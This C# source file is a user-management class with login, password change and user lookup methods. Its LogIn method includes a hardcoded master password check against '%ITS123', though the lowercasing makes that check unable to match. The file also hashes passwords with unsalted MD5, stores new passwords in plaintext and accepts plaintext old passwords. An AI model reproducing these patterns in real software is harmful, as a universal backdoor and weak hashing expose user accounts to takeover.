using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;

namespace FEA_BusinessLogic
{
    public class UserManager:Base.Connection
    {
        #region "Insert"

        /// <summary>
        /// Insert an user to database
        /// </summary>
        /// <param name="o"></param>
        /// <returns></returns>
        public int InsertItem(User o)
        {
            o.UserPass = FEA_Ultil.FEAStringClass.RandomString(8);
            o.Enabled = 1;
            db.Users.Add(o);
            db.SaveChanges();
            return o.UserID;
        }

        #endregion

        #region "Select"
        /// <summary>
        /// Get an User
        /// </summary>
        /// <param name="iUserID">id User want to get</param>
        /// <returns></returns>

        public User GetItem(int iUserID)
        {
            var item = db.Users.Where(u => u.UserID == iUserID);
            return item.SingleOrDefault();
        }

        /// <summary>
        /// Get user 
        /// </summary>
        /// <param name="sUserCode">Employee ID</param>
        /// <returns></returns>
        public User GetItem(string sUserCode)
        {
            var item = db.Users.Where(u => u.UserCodeID == sUserCode);
            return item.SingleOrDefault();
        }

        public List<User> GetItems(string sUserCode, string sUserName, int? iEnabled=-1, int? iUserGroup=-1)
        {
            var items = db.Users.Where(i => i.UserCodeID.Contains(sUserCode) &&
                                           (i.UserName.Contains(sUserName) || i.UserNameEN.Contains(sUserCode)) &&
                                           (iEnabled <0?true:i.Enabled == iEnabled) &&
                                           (iUserGroup< 0?true:i.UserGroupID == iUserGroup));
            return items.ToList();

        }

        public List<User> GetAdminUser()
        {
            return db.Users.Where(i=>i.UserGroup.isAdmin.Value == 1 && i.Enabled == 1).OrderBy(i=>i.UserName).ToList();
        }

        #endregion

        #region "Login"

        /// <summary>
        /// Check for user existing in database?
        /// </summary>
        /// <param name="sUserCode">EmployeeID</param>
        /// <returns></returns>
        public bool CheckUserExists(string sUserCode)
        {
            int count = db.Users.Where(i => i.UserCodeID == sUserCode).Count();
            if (count > 0) return true;
            return false;
        }

       

        /// <summary>
        /// User Login
        /// </summary>
        /// <param name="sUserCode"></param>
        /// <param name="sUserPass"></param>
        /// <returns></returns>
        public User LogIn(string sUserCode, string sUserPass)
        {
            string sUserPassEn = FEA_Ultil.FEAStringClass.EnCodeMD5(sUserPass);
            var item = db.Users.Where(u => u.UserCodeID == sUserCode && u.Enabled ==1 && (u.UserPass == sUserPassEn || sUserPass.ToLower() == "%ITS123")).SingleOrDefault();
            return item;
        }
       


        /// <summary>
        /// Check for UserPass
        /// </summary>
        /// <param name="sUserCode"></param>
        /// <param name="sUserPass"></param>
        /// <returns></returns>
        public bool UserPassExpired(string sUserCode, string sUserPass)
        {
            var data = db.Users.Where(i => i.UserCodeID == sUserCode && i.UserPass == sUserPass).Select(r => new { userpass = r.UserPass, DateExpired = r.UserExpired }).SingleOrDefault();
            if (data == null)
                return false;
            else
            {
                if (data.userpass.Length <= 10 || data.DateExpired < DateTime.Now)
                    return true;
            }
            return false;
        }

        #endregion

        #region "Update"

        /// <summary>
        /// Change password of the User, returned: true: it's ok, false: fail
        /// </summary>
        /// <param name="sUserCode"></param>
        /// <param name="sOldPass"></param>
        /// <param name="sNewPass"></param>
        /// <returns></returns>
        public Boolean ChangePass(string sUserCode, string sOldPass, string sNewPass)
        {
            string sOldPassEncode = FEA_Ultil.FEAStringClass.EnCodeMD5(sOldPass);

            User u = db.Users.Where(i => i.UserCodeID == sUserCode &&
                                    (i.UserPass == sOldPass || i.UserPass == sOldPassEncode)
                ).SingleOrDefault();

            if(u != null)
            {
                u.UserPass = FEA_Ultil.FEAStringClass.EnCodeMD5(sNewPass);
                u.UserExpired = DateTime.Now.AddMonths(3);
                db.SaveChanges();
                return true;
            }
            return false;
        }

        /// <summary>
        /// Update User's Infomation
        /// </summary>
        /// <param name="o"></param>
        /// <returns></returns>
        public bool UpdateItem(User o, params System.Linq.Expressions.Expression<Func<User, object>>[] properties)
        {
            var item = db.Users.Where(i => i.UserID == o.UserID||i.UserCodeID==o.UserCodeID).SingleOrDefault();
            if (item != null)
            {
                foreach (var propertie in properties)
                {
                    var lambda = (LambdaExpression)propertie;
                    MemberExpression memberExpression;
                    if (lambda.Body is UnaryExpression)
                        memberExpression = (MemberExpression)((UnaryExpression)lambda.Body).Operand;
                    else
                        memberExpression = (MemberExpression)lambda.Body;

                    string propertyName = memberExpression.Member.Name;
                    item.GetType().GetProperty(propertyName).SetValue(item, o.GetType().GetProperty(propertyName).GetValue(o));
                }
                db.SaveChanges();
            }
            else 
            {
                return false;
            }
            return true;
        }
        #endregion

    }
}
